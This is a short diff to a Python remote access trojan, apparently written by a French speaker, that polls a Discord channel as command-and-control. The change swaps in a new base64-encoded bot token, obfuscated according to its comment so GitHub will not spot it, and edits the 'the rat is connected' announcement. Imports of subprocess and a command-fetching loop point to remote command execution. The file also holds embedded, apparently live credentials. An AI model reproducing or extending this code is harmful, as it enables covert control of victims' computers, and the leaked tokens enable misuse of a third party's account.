@@ -1,7 +1,7 @@
 import os, time, json, urllib.request, subprocess, base64
 
 # Token encodé en base64 (invisible pour github)
-B64_TOKEN = "TVRVMk5URTRPVFUyTVRjNU1qUTNOVEF3TUEuR1lVaVV6LmpYV2I2UWoxZGFWWTN3NERhUVFCcFZOcWV0TUYyekNtRTA1a01z"
+B64_TOKEN = "TVRVMk5URTRPVFUyTVRjNU1qUTNOVEF3TUEuR0k4X0huLktBczNFOFJwV3pGeUgzbVdLTWhveVNkc1BkZE9YUjkzdV9SWkNN"
 TOKEN = base64.b64decode(B64_TOKEN).decode('utf-8')
 CHANNEL = "1566873777013268513"
 API = f"https://discord.com/api/v9/channels/{CHANNEL}/messages"
@@ -23,7 +23,7 @@ def get_cmd():
     except: pass
     return None, None
 
-send_msg("**Le rat est connecté (technique poussée).**")
+send_msg("**Le rat est connecté (nouveau token).**")
 
 last_id = None
 while True:
